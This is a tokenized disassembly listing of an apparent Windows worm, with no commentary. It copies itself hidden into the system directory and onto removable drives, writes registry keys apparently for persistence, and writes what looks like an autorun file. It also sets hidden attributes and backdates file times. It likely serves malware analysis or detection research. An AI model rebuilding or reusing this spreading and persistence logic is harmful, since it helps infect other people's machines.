sub_401000
mov eax sub_40221c
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40105d
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
call sub_401539
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
sub_40105d
push ecx
push ebx
push ebp
push esi
push edi
push rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov [ esp ] rw-data
call sub_40104a
mov esi rw-data
push esi
call sub_40104a
push rw-data
call sub_40104a
mov edi rw-data
push edi
call sub_40104a
mov ebp rw-data
push ebp
call sub_40104a
mov ebx rw-data
push ebx
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push rw-data
call sub_40104a
push esi
call sub_40104a
add esp 0x40
mov esi rw-data
push 0x200
push esi
call [ GetWindowsDirectoryA@IAT ]
push rw-data
push esi
call strcat
push rw-data
push esi
call strcat
push 0x1
call sub_4015cf
add esp 0x14
xor esi esi
push edi
mov edi [ CreateEventA@IAT ]
push esi
push esi
push esi
call edi
push ebp
push esi
mov [ rw-data ] eax
push esi
push esi
call edi
push ebx
push esi
push esi
push esi
mov [ rw-data ] eax
call edi
push esi
mov [ rw-data ] eax
call sub_4011ed
pop ecx
call sub_4013a9
call sub_4012e6
lea eax [ esp + 0x10 ]
push eax
push esi
push esi
push r-xdata
push esi
push esi
call [ __import_lookup_table_0(KERNEL32:CreateThread) ]
push 0x1
pop eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_4011ed
push ebp
mov ebp esp
sub esp 0x288
push ebx
xor ebx ebx
push esi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x80
xor esi esi
call [ __import_lookup_table_1(ADVAPI32:RegCreateKeyExA) ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
push edi
lea eax [ ebp - 0x288 ]
push 0x200
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x288 ]
push 0x5c
push eax
call [ __import_lookup_table_2(MSVCRT:strrchr) ]
mov esi eax
inc esi
push esi
push rw-data
call strcpy
mov dl [ esi ]
add esp 0x10
xor edi edi
cmp dl bl
je r-xdata
mov al [ ebp - 0x88 ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] bl
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
pop edi
lea ecx [ ebp - 0x88 ]
mov eax esi
sub ecx esi
cmp [ ebp + 0x8 ] ebx
mov [ esi + rw-data ] bl
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
inc dl
inc edi
mov [ ecx + eax ] dl
mov dl [ eax + 0x1 ]
inc eax
cmp dl bl
jne r-xdata
pop esi
pop ebx
leave
retn
cmp al bl
je r-xdata
sub_4012e6
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x20006
push esi
push rw-data
push esi
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x9f
mov [ ebp - 0x4 ] esi
call [ __import_lookup_table_1(ADVAPI32:RegCreateKeyExA) ]
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push 0x4
push esi
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_401342
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
call [ __import_lookup_table_1(ADVAPI32:RegCreateKeyExA) ]
cmp [ ebp + 0xc ] 0x1
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
call strlen
pop ecx
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
jmp r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
sub_4013a9
push ebp
mov ebp esp
sub esp 0x600
push ebx
push esi
mov esi rw-data
push edi
xor ebx ebx
push esi
push ebx
push 0x1f0001
call [ __import_lookup_table_0(KERNEL32:OpenMutexA) ]
cmp eax ebx
je r-xdata
push esi
push ebx
push ebx
call [ CreateMutexA@IAT ]
lea eax [ ebp - 0x600 ]
push 0x400
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov [ ebp + eax - 0x600 ] bl
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x600 ]
push eax
call [ __import_lookup_table_0(KERNEL32:lstrcmpiA) ]
test eax eax
je r-xdata
push eax
call [ __import_lookup_table_0(KERNEL32:CloseHandle) ]
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:SetEvent) ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x200 ]
push ebx
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
push ebx
push edi
call sub_401342
pop ecx
pop ecx
push 0x1
push edi
call sub_401342
push 0x1
call sub_4011ed
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
mov esi [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x200 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x200 ]
push ebx
push eax
lea eax [ ebp - 0x600 ]
push eax
call [ __import_lookup_table_0(KERNEL32:CopyFileA) ]
lea eax [ ebp - 0x200 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ ebp - 0x200 ]
push eax
call esi
lea eax [ ebp - 0x200 ]
push eax
call sub_401d5e
pop ecx
push 0x1
call [ ExitProcess@IAT ]
sub_401539
push ebp
mov ebp esp
sub esp 0x200
push ebx
xor ebx ebx
push ebx
call sub_4015cf
pop ecx
lea eax [ ebp - 0x200 ]
push eax
push 0x200
call [ __import_lookup_table_0(KERNEL32:GetLogicalDriveStringsA) ]
test eax eax
je r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x200 ] bl
je r-xdata
push esi
push edi
lea esi [ ebp - 0x200 ]
add ebx edi
cmp [ ebp + ebx - 0x200 ] 0x0
lea esi [ ebp + ebx - 0x200 ]
jne r-xdata
push eax
call sub_4016d1
test eax eax
pop ecx
je r-xdata
push esi
call strlen
mov edi eax
movsx eax [ esi ]
push eax
inc edi
call [ __import_lookup_table_2(MSVCRT:toupper) ]
pop ecx
cmp eax 0x43
pop ecx
jl r-xdata
pop edi
pop esi
push esi
call sub_401e05
pop ecx
test eax eax
push esi
jne r-xdata
call sub_401f26
call sub_401903
push esi
call sub_4016fd
pop ecx
jmp r-xdata
pop ecx
sub_4015cf
push ebp
mov ebp esp
sub esp 0x210
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push edi
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x210 ]
push eax
push 0x200
call [ __import_lookup_table_0(KERNEL32:GetLogicalDriveStringsA) ]
test eax eax
je r-xdata
push 0x18
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x210 ] 0x0
je r-xdata
pop edi
pop ebx
leave
retn
xor ecx ecx
push esi
lea esi [ ebp - 0x210 ]
add ecx 0x4
cmp ecx 0x60
jl r-xdata
cmp [ ecx + rw-data ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
cmp [ ebp + eax - 0x210 ] 0x0
mov [ ebp - 0x4 ] eax
lea esi [ ebp + eax - 0x210 ]
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
cmp [ ecx + rw-data ] ebx
lea eax [ ecx + rw-data ]
je r-xdata
mov [ eax ] ebx
push esi
call strlen
inc eax
mov [ ebp - 0x8 ] eax
movsx eax [ esi ]
push eax
call [ __import_lookup_table_2(MSVCRT:toupper) ]
mov edi eax
pop ecx
cmp edi 0x43
pop ecx
jl r-xdata
pop esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax 0x3
jne r-xdata
lea ebx [ edi * 4 + rw-data ]
lea eax [ ebp - 0x10 ]
mov [ ebx ] edi
xor edi edi
push edi
push eax
push edi
push esi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ ebp - 0xc ] edi
ja r-xdata
mov [ edi * 4 + rw-data ] edi
jmp r-xdata
xor ebx ebx
jb r-xdata
and [ ebx ] 0x0
cmp [ ebp - 0x10 ] 0x3b9aca00
jae r-xdata
sub_4016d1
mov edx [ esp + 0x4 ]
lea eax [ edx * 4 - 0x104 ]
cmp [ eax + rw-data ] 0x0
lea ecx [ eax + rw-data ]
jne r-xdata
xor eax eax
retn
cmp [ eax + rw-data ] 0x0
je r-xdata
push 0x1
mov [ ecx ] edx
pop eax
retn
sub_4016fd
push ebp
mov ebp esp
sub esp 0x5a0
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call [ GetDiskFreeSpaceExA@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0xc ]
push eax
mov esi [ __import_lookup_table_2(MSVCRT:sprintf) ]
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x5a0 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x5a0 ]
push eax
call sub_401dcc
add esp 0x24
mov edi 0xf4240
push ebx
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_402020
push eax
push ebx
push edi
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_402020
mov edi [ ebp + 0x8 ]
push eax
push edi
lea eax [ ebp - 0x5a0 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x5a0 ]
push eax
call sub_401dcc
add esp 0x18
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ ebp - 0x3a0 ]
push edi
push eax
call strcpy
mov esi rw-data
lea eax [ ebp - 0x3a0 ]
push esi
push eax
call sub_401c46
lea eax [ ebp - 0x1a0 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x1a0 ]
push esi
push eax
call strcat
mov esi [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
add esp 0x20
lea eax [ ebp - 0x1a0 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x2a0 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x2a0 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x2a0 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x2a0 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:fopen) ]
add esp 0x18
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0xa0 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ __import_lookup_table_2(MSVCRT:fscanf) ]
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push rw-data
call sub_401dcc
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1e8480
jae r-xdata
push [ ebp + 0x8 ]
call [ __import_lookup_table_2(MSVCRT:fclose) ]
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x1a0 ]
push eax
call strcpy
lea eax [ ebp - 0x1a0 ]
push 0x5c
push eax
call [ __import_lookup_table_2(MSVCRT:strchr) ]
add esp 0x10
test eax eax
jne r-xdata
pop ecx
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x3a0 ]
push eax
call sub_401c46
lea eax [ ebp - 0x1a0 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x1a0 ]
push eax
call strcat
add esp 0x18
lea eax [ ebp - 0x1a0 ]
push ebx
push eax
call esi
jmp r-xdata
sub_401903
push ebp
mov ebp esp
sub esp 0x624
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x24 ]
push eax
push esi
call [ GetDiskFreeSpaceExA@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x10 ]
push eax
mov edi [ __import_lookup_table_2(MSVCRT:sprintf) ]
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x624 ]
push rw-data
push eax
call edi
lea eax [ ebp - 0x624 ]
push eax
call sub_401dcc
add esp 0x24
mov ebx 0xf4240
push 0x0
push ebx
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_402020
push eax
push 0x0
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_402020
push eax
push esi
lea eax [ ebp - 0x624 ]
push rw-data
push eax
call edi
lea eax [ ebp - 0x624 ]
push eax
call sub_401dcc
add esp 0x18
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
lea eax [ ebp - 0x324 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x324 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x324 ]
push eax
lea eax [ ebp - 0x424 ]
push eax
call strcpy
lea eax [ ebp - 0x324 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x424 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0xa4 ]
push esi
push eax
call strcpy
mov edi rw-data
lea eax [ ebp - 0xa4 ]
push edi
push eax
call strcat
add esp 0x30
lea eax [ ebp - 0xa4 ]
push 0x1
push eax
lea eax [ ebp - 0x424 ]
push eax
call [ __import_lookup_table_0(KERNEL32:CopyFileA) ]
lea eax [ ebp - 0xa4 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ ebp - 0xa4 ]
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0xa4 ]
push esi
push eax
call strcpy
lea eax [ ebp - 0xa4 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0xa4 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0xa4 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:fopen) ]
mov esi [ __import_lookup_table_2(MSVCRT:fprintf) ]
push rw-data
push rw-data
push eax
mov [ ebp - 0x4 ] eax
call esi
push edi
mov ebx rw-data
push rw-data
push ebx
push [ ebp - 0x4 ]
call esi
push edi
push rw-data
push ebx
push [ ebp - 0x4 ]
call esi
push edi
push rw-data
push rw-data
mov edi rw-data
push edi
push rw-data
push [ ebp - 0x4 ]
call esi
add esp 0x4c
push rw-data
push edi
push ebx
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
call [ __import_lookup_table_2(MSVCRT:fclose) ]
mov esi [ GetFileAttributesA@IAT ]
add esp 0x14
lea eax [ ebp - 0xa4 ]
push eax
call esi
mov edi [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
or al 0x6
push eax
lea eax [ ebp - 0xa4 ]
push eax
call edi
lea eax [ ebp - 0x324 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:fopen) ]
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x1a4 ]
push eax
push rw-data
push [ ebp - 0x4 ]
call [ __import_lookup_table_2(MSVCRT:fscanf) ]
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push rw-data
call sub_401dcc
jmp r-xdata
cmp [ ebp - 0xc ] 0x1e8480
jae r-xdata
push [ ebp - 0x4 ]
call [ __import_lookup_table_2(MSVCRT:fclose) ]
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x224 ]
push eax
call strcpy
lea eax [ ebp - 0x224 ]
push 0x5c
push eax
call [ __import_lookup_table_2(MSVCRT:strchr) ]
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
pop ecx
push [ ebp + 0x8 ]
and [ ebx ] 0x0
lea eax [ ebp - 0x124 ]
push eax
call strcpy
lea eax [ ebp - 0x224 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call strcat
inc ebx
lea eax [ ebp - 0x1a4 ]
push ebx
push eax
call strcpy
add esp 0x18
lea eax [ ebp - 0x124 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x124 ]
push eax
call esi
or al 0x6
push eax
lea eax [ ebp - 0x124 ]
push eax
call edi
lea eax [ ebp - 0x124 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call sub_401c46
add esp 0x10
jmp r-xdata
sub_401c46
push ebp
mov ebp esp
sub esp 0x500
lea eax [ ebp - 0x300 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x300 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x200 ]
push eax
call strcpy
push [ ebp + 0xc ]
lea eax [ ebp - 0x200 ]
push eax
call strcat
lea eax [ ebp - 0x100 ]
push eax
call sub_401d01
add esp 0x2c
lea eax [ ebp - 0x200 ]
push 0x0
push eax
lea eax [ ebp - 0x100 ]
push eax
call [ __import_lookup_table_0(KERNEL32:CopyFileA) ]
test eax eax
je r-xdata
leave
retn
push [ ebp + 0xc ]
lea eax [ ebp - 0x500 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:sprintf) ]
lea eax [ ebp - 0x500 ]
push eax
call sub_401dcc
add esp 0x10
sub_401d01
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push esi
push eax
push 0x80
push 0x3
push eax
push eax
push 0x40000000
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call [ SetFileTime@IAT ]
push esi
call [ __import_lookup_table_0(KERNEL32:CloseHandle) ]
sub_401d5e
push ebp
mov ebp esp
sub esp 0x54
push esi
xor esi esi
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
pop esi
leave
retn
sub_401dcc
push esi
push rw-data
push rw-data
call [ __import_lookup_table_2(MSVCRT:fopen) ]
pop ecx
mov esi eax
pop ecx
push esi
push 0x1
push [ esp + 0x10 ]
call strlen
pop ecx
push eax
push [ esp + 0x14 ]
call [ __import_lookup_table_2(MSVCRT:fwrite) ]
push esi
call [ __import_lookup_table_2(MSVCRT:fclose) ]
add esp 0x14
pop esi
retn
sub_401e05
push ebp
mov ebp esp
sub esp 0x200
mov al [ rw-data ]
push ebx
push esi
push edi
push 0x3f
mov [ ebp - 0x200 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x1ff ]
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x100 ]
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:fopen) ]
mov esi [ __import_lookup_table_2(MSVCRT:fclose) ]
add esp 0x18
test eax eax
mov [ ebp + 0x8 ] eax
mov ebx rw-data
mov edi rw-data
je r-xdata
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:fopen) ]
mov edi eax
lea eax [ ebp - 0x200 ]
push eax
push ebx
push edi
call [ __import_lookup_table_2(MSVCRT:fprintf) ]
push edi
call esi
add esp 0x20
lea eax [ ebp - 0x100 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ ebp - 0x100 ]
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
xor eax eax
lea ecx [ ebp - 0x200 ]
push ecx
push ebx
push eax
call [ __import_lookup_table_2(MSVCRT:fscanf) ]
push [ ebp + 0x8 ]
call esi
push edi
call [ __import_lookup_table_2(MSVCRT:atoi) ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x200 ]
push eax
call [ __import_lookup_table_2(MSVCRT:atoi) ]
add esp 0x18
cmp eax [ ebp + 0x8 ]
jle r-xdata
lea eax [ ebp - 0x100 ]
push 0x0
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
lea eax [ ebp - 0x100 ]
push eax
call [ DeleteFileA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401f26
push ebp
mov ebp esp
sub esp 0x300
mov dl [ rw-data ]
push esi
push edi
push 0x3f
pop ecx
xor eax eax
lea edi [ ebp - 0x1ff ]
mov [ ebp - 0x200 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x3f
xor eax eax
pop ecx
lea edi [ ebp - 0xff ]
mov [ ebp - 0x100 ] dl
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x200 ]
push eax
call strcpy
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call [ __import_lookup_table_2(MSVCRT:fopen) ]
mov esi [ __import_lookup_table_2(MSVCRT:fscanf) ]
mov edi eax
lea eax [ ebp - 0x100 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x100 ]
push eax
push rw-data
push edi
call esi
push edi
call [ __import_lookup_table_2(MSVCRT:fclose) ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x300 ]
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x300 ]
push eax
call strcat
add esp 0x44
lea eax [ ebp - 0x300 ]
push eax
call sub_401d5e
pop ecx
pop edi
pop esi
leave
retn
sub_402020
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __import_lookup_table_2(MSVCRT:__set_app_type) ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40220d
cmp [ rw-data ] ebx
jne r-xdata
call sub_4021f8
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40220a
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ __import_lookup_table_0(KERNEL32:GetStartupInfoA) ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ __import_lookup_table_0(KERNEL32:GetModuleHandleA) ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ __import_lookup_table_2(MSVCRT:exit) ]
sub_401030
mov eax r-xdata
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ __import_lookup_table_2(MSVCRT:strcat) ]
strcpy
jmp [ __import_lookup_table_2(MSVCRT:strcpy) ]
strlen
jmp [ __import_lookup_table_2(MSVCRT:strlen) ]
memset
jmp [ __import_lookup_table_2(MSVCRT:memset) ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4021f8
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40220a
xor eax eax
retn
sub_40220d
retn
_except_handler3
jmp [ __import_lookup_table_2(MSVCRT:_except_handler3) ]
_controlfp
jmp [ _controlfp@IAT ]
sub_40221c
mov eax r--data
jmp __CxxFrameHandler
